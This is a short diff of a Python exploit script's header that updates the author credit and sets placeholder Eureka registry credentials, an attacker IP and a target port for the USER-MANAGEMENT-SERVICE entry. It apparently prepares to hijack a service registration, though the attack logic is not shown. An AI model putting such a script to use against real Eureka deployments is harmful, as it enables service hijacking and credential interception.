@@ -1,11 +1,13 @@
 import requests
 
 """
-Exploit Author: z3rodol
+Exploit Author: Délalom Wilfried Telli (z3rodol)
 Exploit Date: August, 2025
 """
 
-EUREKA_URL = "http://{EurekaSrvr}:{Eureka_PASSWORD}@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE"
+EUREKA_USER = "xxxxxxxxxx" # Change here
+EUREKA_PASSWORD = "xxxxxxxxx" # Change here
+EUREKA_URL = f"http://{EUREKA_USER}:{EUREKA_PASSWORD}@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE"
 MY_IP = "xx.xx.xx.xx" # Change here
 TARGET_PORT = 8081
 
